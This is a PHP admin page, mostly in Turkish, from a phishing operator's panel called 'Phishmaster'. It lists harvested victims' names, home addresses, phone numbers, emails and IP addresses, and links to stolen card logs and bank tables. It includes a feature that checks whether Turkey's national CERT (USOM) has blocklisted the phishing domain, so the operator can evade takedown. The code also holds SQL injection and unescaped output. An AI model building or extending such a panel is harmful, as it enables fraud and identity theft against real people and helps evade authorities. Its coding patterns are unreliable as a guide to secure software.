<?php include_once(__DIR__ . "/../config.php"); include_once(__DIR__ . "/Data/Server/GrabIP.php"); include_once(__DIR__ . "/function/MainFunction.php"); include_once(__DIR__ . "/Data/Client/GetBank.php"); giris_dogrulama($pdo);

  $QueryServer = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
  $QueryAdmin = $pdo->query("SELECT * FROM admin WHERE ip_adresi = '{$ip}'")->fetch(PDO::FETCH_ASSOC);

  if($QueryServer["ip_filter"] == 1) {
    if(!in_array($ip, $ip_filter_config)) {
      die("IP Firewall - monke");
    }
  }

  $dongu = $pdo->query('SELECT * FROM logs_adres ORDER BY id DESC');

  if(isset($_POST['truncate'])) {
    if (!isset($_SESSION['giris_yapildi'])) { die(); }
    $pdo->query("TRUNCATE TABLE logs_adres");
    header("Location: address");
    exit;
  }
?>
<!doctype html>
<html lang="tr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>monke - Adres Tablosu</title>
    <meta name="description" content="monke Panel">
    <meta name="author" content="monke">
    <meta name="robots" content="noindex, nofollow">
    
    <meta property="og:title" content="monke Panel">
    <meta property="og:site_name" content="Developed monke">
    <meta property="og:description" content="monke Panel">
    <meta property="og:type" content="website">

    <link rel="shortcut icon" href="assets/media/favicons/favicon.png">
    <link rel="icon" type="image/png" sizes="192x192" href="assets/media/favicons/favicon-192x192.png">
    <link rel="apple-touch-icon" sizes="180x180" href="assets/media/favicons/apple-touch-icon-180x180.png">
    <link rel="stylesheet" id="css-main" href="assets/css/oneui.min.css">
    <link rel="stylesheet" href="assets/js/plugins/datatables-bs5/css/dataTables.bootstrap5.min.css">
  </head>
  <body>
    <div id="page-container" class="sidebar-o sidebar-light enable-page-overlay side-scroll page-header-fixed remember-theme">
      <nav id="sidebar" aria-label="Main Navigation">
        <div class="content-header">
          <a class="fw-semibold text-dual" href="main">
            <span class="smini-visible">
              <i class="fa-solid fa-crosshairs text-primary"></i>
            </span>
            <span class="smini-hide fs-5 tracking-wider">Phish<span class="fw-normal">master</span></span>
          </a>
          <div>
            <button type="button" class="btn btn-sm btn-alt-secondary" data-toggle="layout" data-action="dark_mode_toggle">
              <i class="fa fa-moon"></i>
            </button>
            <div class="dropdown d-inline-block ms-1">
              <button type="button" class="btn btn-sm btn-alt-secondary" id="sidebar-themes-dropdown" data-bs-toggle="dropdown" data-bs-auto-close="outside" aria-haspopup="true" aria-expanded="false">
                <i class="fa fa-brush"></i>
              </button>
              <div class="dropdown-menu dropdown-menu-end fs-sm smini-hide border-0" aria-labelledby="sidebar-themes-dropdown">
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="default">
                  <span>Varsayılan</span>
                  <i class="fa fa-circle text-default"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/amethyst.min.css">
                  <span>Stil 1</span>
                  <i class="fa fa-circle text-amethyst"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/city.min.css">
                  <span>Stil 2</span>
                  <i class="fa fa-circle text-city"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/flat.min.css">
                  <span>Stil 3</span>
                  <i class="fa fa-circle text-flat"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/modern.min.css">
                  <span>Stil 4</span>
                  <i class="fa fa-circle text-modern"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/smooth.min.css">
                  <span>Stil 5</span>
                  <i class="fa fa-circle text-smooth"></i>
                </button>
              </div>
            </div>
            <a class="d-lg-none btn btn-sm btn-alt-secondary ms-1" data-toggle="layout" data-action="sidebar_close" href="javascript:void(0)">
              <i class="fa fa-fw fa-times"></i>
            </a>
          </div>
        </div>
        <div class="js-sidebar-scroll">
          <div class="content-side">
            <ul class="nav-main">
              <li class="nav-main-item">
                <a class="nav-main-link" href="main">
                  <i class="nav-main-link-icon si si-speedometer"></i>
                  <span class="nav-main-link-name">Anasayfa</span>
                </a>
              </li>
              <li class="nav-main-heading">PHISHING</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="logs">
                  <i class="nav-main-link-icon si si-credit-card"></i>
                  <span class="nav-main-link-name">Log Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="bans">
                  <i class="nav-main-link-icon si si-ban"></i>
                  <span class="nav-main-link-name">Ban Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="banks">
                  <i class="nav-main-link-icon fa fa-bank"></i>
                  <span class="nav-main-link-name">Banka Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="urunler">
                  <i class="nav-main-link-icon fa fa-cart-shopping"></i>
                  <span class="nav-main-link-name">Ürün Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link active" href="address">
                  <i class="nav-main-link-icon fa fa-map"></i>
                  <span class="nav-main-link-name">Adres Tablosu</span>
                </a>
              </li>
              <li class="nav-main-heading">ARACLAR</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="javascript:void(0);" id="check_usom">
                  <i class="nav-main-link-icon fa fa-check-double"></i>
                  <span class="nav-main-link-name">USOM Kontrolü</span>
                </a>
              </li>
              <?php if($QueryAdmin['yetki'] == "Superadmin"): ?>
              <li class="nav-main-heading">YONETIM</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="user">
                  <i class="nav-main-link-icon si si-people"></i>
                  <span class="nav-main-link-name">Kullanıcı Yönetimi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="action_history">
                  <i class="nav-main-link-icon si si-list"></i>
                  <span class="nav-main-link-name">İşlem Geçmişi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="javascript:void(0);" id="factory_reset">
                  <i class="nav-main-link-icon fa-solid fa-wrench"></i>
                  <span class="nav-main-link-name">Fabrika Ayarları</span>
                </a>
              </li>
              <?php endif; ?>
            </ul>
          </div>
        </div>
      </nav>
      <header id="page-header">
        <div class="content-header">
          <div class="d-flex align-items-center">
            <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-lg-none" data-toggle="layout" data-action="sidebar_toggle">
              <i class="fa fa-fw fa-bars"></i>
            </button>
            <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-none d-lg-inline-block" data-toggle="layout" data-action="sidebar_mini_toggle">
              <i class="fa fa-fw fa-ellipsis-v"></i>
            </button>
          </div>
          <div class="d-flex align-items-center">
            <div class="dropdown d-inline-block ms-2">
              <button type="button" class="btn btn-sm btn-alt-secondary d-flex align-items-center" id="page-header-user-dropdown" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <img class="rounded-circle" src="assets/media/avatars/avatar0.jpg" style="width: 21px;">
                <span class="d-none d-sm-inline-block ms-2"><?php echo $QueryAdmin['kullanici_adi']; ?></span>
                <i class="fa fa-fw fa-angle-down d-none d-sm-inline-block opacity-50 ms-1 mt-1"></i>
              </button>
              <div class="dropdown-menu dropdown-menu-md dropdown-menu-end p-0 border-0" aria-labelledby="page-header-user-dropdown">
                <div class="p-3 text-center bg-body-light border-bottom rounded-top">
                  <p class="mt-2 mb-0 fw-medium"><?php echo $QueryAdmin['kullanici_adi']; ?></p>
                  <p class="mb-0 text-muted fs-sm fw-medium"><?php echo $QueryAdmin['yetki']; ?></p>
                </div>
                <div class="p-2">
                  <a class="dropdown-item d-flex align-items-center justify-content-between" href="settings">
                    <span class="fs-sm fw-medium">Ayarlar</span>
                  </a>
                  <a class="dropdown-item d-flex align-items-center justify-content-between" href="quit">
                    <span class="fs-sm fw-medium">Çıkış Yap</span>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </header>
      <main id="main-container">
        <div class="bg-body-light">
          <div class="content content-full">
            <div class="d-flex flex-column flex-sm-row justify-content-sm-between align-items-sm-center py-2">
              <div class="flex-grow-1">
                <h1 class="h3 fw-bold mb-2"> Adres Tablosu </h1>
                <h2 class="fs-base lh-base fw-medium text-muted mb-0">
                    <?php echo $mesaj; ?> <a class="link-fx" href="javascript:void(0)"><?php echo $QueryAdmin['kullanici_adi']; ?></a>, bu sayfa sayesinde paneldeki kullanıcıları yönetebilirsin.
                </h2>
              </div>
              <nav class="flex-shrink-0 mt-3 mt-sm-0 ms-sm-3" aria-label="breadcrumb">
                <ol class="breadcrumb breadcrumb-alt">
                  <li class="breadcrumb-item">
                    <a class="link-fx" href="javascript:void(0)">Phishing</a>
                  </li>
                  <li class="breadcrumb-item" aria-current="page"> Adres Tablosu </li>
                </ol>
              </nav>
            </div>
          </div>
        </div>
        <div class="content">
          <div class="block block-rounded">
            <div class="block-content">
              <?php if($adres_sayisi <= 0): ?>
                <span id="tablo" class="justify-content-center text-center m-auto"> <p>Veri Girişi Bekleniyor...</p></span>
              <?php else : ?>
              <div class="table-responsive" id="tablo">
                <center>
                  <div>
                    <div class="btn-group btn-group-sm" role="group">
                      <form method="POST"> <button type="submit" id="truncate" name="truncate" class="btn btn-danger btn-sm"><i class="fa-solid fa-trash"></i> Tümünü Sil</button> </form>
                    </div>
                  </div>
                </center>
                <br>  
                <table class="table table-hover table-vcenter">
                  <thead>
                    <tr>
                      <th class="text-center fw-light fs-sm" style="width: 10%;">ISIM SOYISIM</th>
                      <th class="text-center fw-light fs-sm" style="width: 10%;">IL (ILCE)</th>
                      <th class="text-center fw-light fs-sm" style="width: 10%;">ADRES</th>
                      <th class="text-center fw-light fs-sm" style="width: 10%;">TELEFON</th>
                      <th class="text-center fw-light fs-sm" style="width: 10%;">E-POSTA</th>
                      <th class="text-center fw-light fs-sm" style="width: 10%;">TARIH</th>
                      <th class="text-center fw-light fs-sm" style="width: 10%;">IP ADRESI</th>
                    </tr>
                  </thead>
                  <tbody>
                    <?php foreach($dongu as $yazdir) { ?>
                    <tr>
                      <td class="text-center fw-normal fs-sm"><?= $yazdir['isim']; ?> <?= $yazdir['soyisim']; ?></td>
                      <td class="text-center fw-normal fs-sm"><?= $yazdir['il']; ?> (<?= $yazdir['ilce']; ?>)</td>
                      <td class="text-center fw-normal fs-sm"><?= $yazdir['mahalle']; ?> Mahallesi <?= $yazdir['cadde']; ?> Bina No: <?= $yazdir['bina']; ?>, Kat: <?= $yazdir['kat']; ?>, Daire:<?= $yazdir['daire']; ?> </td>
                      <td class="text-center fw-normal fs-sm"><?= $yazdir['telefon']; ?></td>
                      <td class="text-center fw-normal fs-sm"><?= $yazdir['eposta']; ?></td>
                      <td class="text-center fw-normal fs-sm" title="<?php echo ZamaniFormatla($yazdir['tarih']); ?>"><?php echo $yazdir['tarih']; ?></td>
                      <td class="text-center fw-normal fs-sm"><a href="https://db-ip.com/<?php echo $yazdir['ip_adresi'];?>" target="_blank"><?php echo $yazdir['ip_adresi']; ?></a></td>
                    </tr>
                    <?php } ?>
                  </tbody>
                </table>
              </div>
              <?php endif; ?>
            </div>
          </div>
        </div>
      </main>
      <footer id="page-footer" class="bg-body-light">
        <div class="content py-3">
          <div class="row fs-sm">
            <div class="col-sm-6 order-sm-2 py-1 text-center text-sm-end"> Kullanıcı: <a class="fw-semibold link-fx" href="javascript:void(0)"><?php echo $QueryAdmin['kullanici_adi']; ?></a>
            </div>
            <div class="col-sm-6 order-sm-1 py-1 text-center text-sm-start">
              <a class="fw-semibold link-fx" href="javascript:void(0)">monke</a> &copy; <span data-toggle="year-copy"></span>
            </div>
          </div>
        </div>
      </footer>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
    <script type="text/javascript">
      document.getElementById("check_usom").addEventListener("click", function(e) {
        var domain = window.location.host;

        One.helpers('jq-notify', {type: 'warning', icon: 'fa fa-rotate me-1', message: 'USOM kontrolü yapılıyor!'});

        e.preventDefault();
        
        $.ajax({
          type: "POST",
          url: "./function/CheckUsom.php",
          data: {
            domain: domain
          },
          success: function (data) {
            if(data === "yasaklandi") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: "Domain USOM tarafından yasaklanmış durumda."});
            } else if(data === "yasaklanmadi") {
              One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: "Domain USOM tarafından yasaklanmadı."});
            } else if(data === "baglanti hatasi") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-check me-1', message: "USOM ile bağlantı kurulamadı!"});
            }
          }
        });
      });
      var title = document.title;
      var alttitle = "Vurgun için bekleniyorsun ;)";
      window.onblur = function () { 
        document.title = alttitle;
      };
      window.onfocus = function () { 
        document.title = title;
      };

      var clipboard = new ClipboardJS('.Kopyala');

      clipboard.on('success', function (e) {
        One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: 'Panoya kopyalama işlemi başarılı!'});
      });

      clipboard.on('error', function (e) {
        One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: 'Panoya kopyalama işlemi başarısız!'});
      });

      function SifreOlustur() {
        One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: 'Şifre oluşturma işlemi başarılı!'});
        document.getElementById("sifre").value = SifreOlusturMain()
        document.getElementById("sifre").select();
        document.getElementById("sifre").setSelectionRange(0, 99999);
        navigator.clipboard.writeText(document.getElementById("sifre").value);
      }
      document.getElementById("factory_reset").addEventListener("click", function(e) {
        Swal.fire({
          title: 'Emin misin?',
          text: "Bu işlemi geri alamıyacaksın ve bütün veriler silinecektir!",
          icon: 'warning',
          showCancelButton: true,
          confirmButtonColor: '#3085d6',
          cancelButtonColor: '#d33',
          confirmButtonText: 'Evet',
          cancelButtonText: 'Hayır'
        }).then((result) => {
          if (result.isConfirmed) {
            e.preventDefault();
            $.ajax({
              type: "POST",
              url: "./function/FactoryReset.php",
              data: {
                izin: true
              },
              success: function (data) {
                Swal.fire({
                  title: 'İşlem Başarılı!',
                  text: "Bütün veriler başarıyla silindi.",
                  icon: 'success',
                  confirmButtonColor: '#3085d6',
                  confirmButtonText: 'Tamam'
                }).then((result) => {
                  if (result.isConfirmed) {
                    window.location.href = 'quit';
                  }
                })
              }
            });
          }
        })
      });
      function SifreOlusturMain( len ) {
        var length = (len)?(len):(10);
        var string = "abcdefghijklmnopqrstuvwxyz";
        var numeric = '0123456789';
        var punctuation = '!@#$%^&*~`?><=';
        var password = "";
        var character = "";
        var crunch = true;
        while( password.length<length ) {
            entity1 = Math.ceil(string.length * Math.random()*Math.random());
            entity2 = Math.ceil(numeric.length * Math.random()*Math.random());
            entity3 = Math.ceil(punctuation.length * Math.random()*Math.random());
            hold = string.charAt( entity1 );
            hold = (password.length%2==0)?(hold.toUpperCase()):(hold);
            character += hold;
            character += numeric.charAt( entity2 );
            character += punctuation.charAt( entity3 );
            password = character;
        }
        password = password.split('').sort(function(){return 0.5-Math.random()}).join('');
        return password.substr(0,len);
      }
      
      
    </script>
    <script src="assets/js/oneui.app.min.js"></script>
    <script src="assets/js/lib/jquery.min.js"></script>
    <script src="assets/js/plugins/jquery-validation/jquery.validate.min.js"></script>
    <script src="assets/js/pages/kullanici-ekle.min.js"></script>
    <script src="assets/js/pages/kullanici-sil.min.js"></script>
    <script src="assets/js/plugins/bootstrap-notify/bootstrap-notify.min.js"></script>
    <script src="assets/js/plugins/datatables/jquery.dataTables.min.js"></script>
    <script src="assets/js/plugins/datatables-bs5/js/dataTables.bootstrap5.min.js"></script>
    <script src="assets/js/plugins/datatables-buttons/dataTables.buttons.min.js"></script>
    <script src="assets/js/pages/datatable.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>One.helpersOnLoad(['jq-notify']);</script>
  </body>
</html>